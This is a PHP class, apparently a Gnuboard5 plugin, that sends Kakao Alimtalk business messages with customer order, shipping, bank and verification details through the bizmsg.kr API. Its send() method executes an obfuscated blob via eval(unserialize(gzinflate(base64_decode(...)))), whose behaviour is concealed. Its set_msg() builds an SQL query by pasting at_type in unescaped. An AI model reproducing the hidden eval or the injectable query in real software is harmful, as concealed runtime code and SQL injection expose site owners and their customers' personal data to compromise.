<?php
class bizmsg {

    private $userId         = BIZM_ALIMT_USERID;
    private $profile         = BIZM_ALIMT_PROFILE_KEY;
	public  $msg            = ''; // [필수] 사용자에게 전달될 메시지 (공백포함 1,000자)

    public $at_type         = ''; // 발송구분
    public $message_type    = 'at'; // [필수] 메시지 타입 (at:알림톡, ft:친구톡)
    public $phn             = ''; // [필수] 수신자 전화번호 (국가코드(대한민국:82)를 포함한 전화번호)

    public $tmplId          = ''; // [선택] 메시지 유형을 확인할 템플릿 코드 (사전에 승인된 템플릿의 코드)
    public $smsKind         = 'S'; // [선택] 카카오 비즈메시지 발송이 실패했을 때 SMS 전환발송을 사용하는 경우 SMS/LMS 구분 (SMS: S, LMS: L)
    public $msgSms          = ''; // [선택] SMS 전환발송을 위한 메시지
    public $smsSender       = '070-8889-1540'; // [선택] SMS 전환발송 시 발신번호
    public $smsLmsTit       = ''; // [선택] LMS 발송을 위한 제목
    public $btn_name        = ''; // [선택] 메시지에 첨부할 버튼 이름 (템플릿 등록시 정의된 버튼 이름)
    public $btn_url         = ''; // [선택] 메시지에 첨부할 버튼의 URL(템플릿 등록시 정의된 버튼 URL)

    public $usr_name          = '';
    public $usr_shipping_corp = '';
    public $usr_shipping_num  = '';
    public $usr_shipping_addr  = '';
    public $usr_bank_price    = '';
    public $usr_bank_num      = '';
    public $usr_od_id         = '';
    public $usr_order_price   = '';
    public $usr_order_items   = '';
    public $usr_subject       = ''; // bizm : 2020-06-01
    public $usr_link_url      = ''; // bizm : 2020-06-01
    public $usr_event_text    = ''; // bizm : 2020-06-01
	public $usr_hp_auth      = '';
	public $usr_company     = '';


    public $button1           = array();
    public $button2           = array();
    public $button3           = array();
    public $button4           = array();
    public $button5           = array();

    public function __construct() {

    }

    function send() {

        $set_msg        = $this->set_msg();
        $this->msg      = $set_msg ? $set_msg : $this->msg;
        $this->phn      = preg_replace("/[^0-9]*/s", "", $this->phn);

        $data = array();

        eval(unserialize(gzinflate(base64_decode('lVRdi9pAFH1f2P8wXYQxkEbXbr8UW7ZuFmWtShL7IkvIJqMO5ouZEbuWQh/6D1poC/vcpy2UQvvWP7T6Izr50qQJNB3Qi/fcc+65dwZp8/jk8dPmUWVJbNAGcM6gBJnf5N+14LNarXiQVoh5ax7hggRp03NdZLIadrE5R+ZC8uc+bB0egPhUfI8yyvUMQozrqpCDJtCnuuU5BnbhJa+r6KqsvJKVCexq2kjvDlUNXhazfNOzECcFbldrw8YOM+zFFV47GQdmNFAQdG6TZUyEWcpn8lk1rBRBZ6z0hyNN50EEwTZK1nPTL4aqLAJGlqgkpyufnsmKCKaGTctyRnwlSRNQmnHek/tnqhjvr2QrRdbGykBTTgfqeWDzf5p2hoOB3NG03kt5OOaGH5TsuSM06vXMcyGILm2W3CR6jcyImjdk2h5FCbjH8BRU6fKKMlKNxURQF8FDAbT5C0KEeAQK4E1KLTgWRjnWIyGt+/bwIGXTMpgxgQ6i1JghnV374RMNXjabY3r/WRpp5Xj+3A3Ld6cNkuYRnReErhsCuMddP2lA8DwMUlHhsQCaYJ9ogVoN3P38dvf93fb3x82Hm82vL9tPt9v3N2D74/Pm662UN0S8KbbR3tRukBjJz8Ac3+5ZqTF2lAjJMxw6+3vqZFt0li+nDr3ArlXgKUYKO6gOLfIUIXyJ2d/NfzlQkWshkiimHUTIXnGfytxFkWjfoRpmRaIRkhGNU1yU/wtP8WwCzanOMAtuq3XU+gM='))));

        if ($this->button1) {
            $data['button1'] = $this->button1;
        }
        if ($this->button2) {
            $data['button2'] = $this->button2;
        }
        if ($this->button3) {
            $data['button3'] = $this->button3;
        }
        if ($this->button4) {
            $data['button4'] = $this->button4;
        }
        if ($this->button5) {
            $data['button5'] = $this->button5;
        }

        $data = '['.json_encode($data).']';

        $headers = array('Content-type: Application/json', 'userId: '. $this->userId);

        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, 'https://alimtalk-api.bizmsg.kr/v2/sender/send');
        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($curl, CURLOPT_VERBOSE, true);
        curl_setopt($curl, CURLOPT_HEADER, false);
        curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_SSLVERSION, true); // SSL 버젼 (https 접속시에 필요)
        $result = curl_exec($curl);
        curl_close($curl);

        return $result;
    }

    function set_msg() {

        global $g5;

        $sql = "select B.* from {$g5['bizm_alimtalk_tplsel_table']} as A inner join {$g5['bizm_alimtalk_tplmsg_table']} as B on A.at_id = B.at_id where A.at_type = '".trim($this->at_type)."' ";
        $at = sql_fetch($sql, true);

        if (!$at['at_tplcode']) {
            return false;
        }
        $this->tmplId   = $at['at_tplcode'];

        if ($at['at_button1_name']) {
            $this->button1['name']       = $at['at_button1_name'];
            $this->button1['type']       = $at['at_button1_type'];
            switch ($at['at_button1_type']) {
                case 'WL':
                    $this->button1['url_mobile'] = $at['at_button1_url_1'];
                    if ($at['at_button1_url_2']) {
                        $this->button1['url_pc'] = $at['at_button1_url_2'];
                    }
                    break;
                case 'AL':
                    $this->button1['scheme_android'] = $at['at_button1_url_1'];
                    $this->button1['scheme_ios'] = $at['at_button1_url_2'];
                    break;
            }
        }
        if ($at['at_button2_name']) {
            $this->button2['name']       = $at['at_button2_name'];
            $this->button2['type']       = $at['at_button2_type'];
            switch ($at['at_button2_type']) {
                case 'WL':
                    $this->button2['url_mobile'] = $at['at_button2_url_1'];
                    if ($at['at_button2_url_2']) {
                        $this->button2['url_pc'] = $at['at_button2_url_2'];
                    }
                    break;
                case 'AL':
                    $this->button2['scheme_android'] = $at['at_button2_url_1'];
                    $this->button2['scheme_ios'] = $at['at_button2_url_2'];
                    break;
            }
        }
        if ($at['at_button3_name']) {
            $this->button3['name']       = $at['at_button3_name'];
            $this->button3['type']       = $at['at_button3_type'];
            switch ($at['at_button3_type']) {
                case 'WL':
                    $this->button3['url_mobile'] = $at['at_button3_url_1'];
                    if ($at['at_button3_url_2']) {
                        $this->button3['url_pc'] = $at['at_button3_url_2'];
                    }
                    break;
                case 'AL':
                    $this->button3['scheme_android'] = $at['at_button3_url_1'];
                    $this->button3['scheme_ios'] = $at['at_button3_url_2'];
                    break;
            }
        }
        if ($at['at_button4_name']) {
            $this->button4['name']       = $at['at_button4_name'];
            $this->button4['type']       = $at['at_button4_type'];
            switch ($at['at_button4_type']) {
                case 'WL':
                    $this->button4['url_mobile'] = $at['at_button4_url_1'];
                    if ($at['at_button4_url_2']) {
                        $this->button4['url_pc'] = $at['at_button4_url_2'];
                    }
                    break;
                case 'AL':
                    $this->button4['scheme_android'] = $at['at_button4_url_1'];
                    $this->button4['scheme_ios'] = $at['at_button4_url_2'];
                    break;
            }
        }
        if ($at['at_button5_name']) {
            $this->button5['name']       = $at['at_button5_name'];
            $this->button5['type']       = $at['at_button5_type'];
            switch ($at['at_button5_type']) {
                case 'WL':
                    $this->button5['url_mobile'] = $at['at_button5_url_1'];
                    if ($at['at_button5_url_2']) {
                        $this->button5['url_pc'] = $at['at_button5_url_2'];
                    }
                    break;
                case 'AL':
                    $this->button5['scheme_android'] = $at['at_button5_url_1'];
                    $this->button5['scheme_ios'] = $at['at_button5_url_2'];
                    break;
            }
        }

        #{이름}, #{택배회사}, #{운송장번호}, #{입금액}, #{주문번호}, #{주문금액}
        $at_msg = $at['at_msg'];
        $at_msg = str_replace('#{이름}', $this->usr_name, $at_msg);
        $at_msg = str_replace('#{택배회사}', $this->usr_shipping_corp, $at_msg);
        $at_msg = str_replace('#{운송장번호}', $this->usr_shipping_num, $at_msg);
        $at_msg = str_replace('#{배송지}', $this->usr_shipping_addr, $at_msg);
        $at_msg = str_replace('#{입금액}', $this->usr_bank_price, $at_msg);
        $at_msg = str_replace('#{입금계좌}', $this->usr_bank_num, $at_msg);
        $at_msg = str_replace('#{주문번호}', $this->usr_od_id, $at_msg);
        $at_msg = str_replace('#{주문금액}', $this->usr_order_price, $at_msg);
        $at_msg = str_replace('#{주문상품}', $this->usr_order_items, $at_msg);
        $at_msg = str_replace('#{제목}', $this->usr_subject, $at_msg); // wetoz : 2020-06-01
        $at_msg = str_replace('#{연결링크}', $this->usr_link_url, $at_msg); // wetoz : 2020-06-01
        $at_msg = str_replace('#{이벤트}', $this->usr_event_text, $at_msg); // wetoz : 2020-06-01
        $at_msg = str_replace('#{인증번호}', $this->usr_hp_auth, $at_msg);
		$at_msg = str_replace('#{업체명}', $this->usr_company, $at_msg);


        $at_msg = addslashes($at_msg);

        return $at_msg;
    }
}